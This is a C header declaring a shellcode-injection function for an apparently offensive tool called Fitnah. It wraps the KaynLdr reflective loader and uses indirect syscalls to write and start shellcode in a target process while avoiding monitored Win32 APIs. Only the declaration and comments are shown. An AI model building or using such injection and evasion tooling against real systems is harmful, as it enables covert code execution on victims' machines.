/*
 * kaynldr.h — KaynLdr PIC shellcode loader wrapper
 *
 * Source: Cracked5pider/KaynLdr (MIT License)
 * https://github.com/Cracked5pider/KaynLdr
 *
 * KaynLdr is a position-independent shellcode reflective loader.
 * This wrapper adapts it for Fitnah: allocation + injection via indirect
 * syscalls (ISysNt*), so the loader itself avoids high-level Win32 APIs.
 *
 * MITRE: T1055.004 (Process Injection: Asynchronous Procedure Call)
 *        T1055.001 (Process Injection: Dynamic-link Library Injection)
 */
#pragma once
#include <windows.h>
#include <stdint.h>

/*
 * KaynInjectShellcode — inject raw shellcode into target process via
 * NtAllocateVirtualMemory + NtWriteVirtualMemory + NtCreateThreadEx,
 * all via our indirect syscall layer.
 *
 * pid       : target process PID (0 = self)
 * shellcode : raw shellcode bytes
 * sc_len    : shellcode length
 *
 * Returns:  heap-allocated JSON result string; caller must free().
 *           {"status":"ok","pid":<n>,"addr":"0x<hex>"}  on success.
 *           {"status":"error","msg":"..."}              on failure.
 */
char *KaynInjectShellcode(DWORD pid, const uint8_t *shellcode, size_t sc_len);
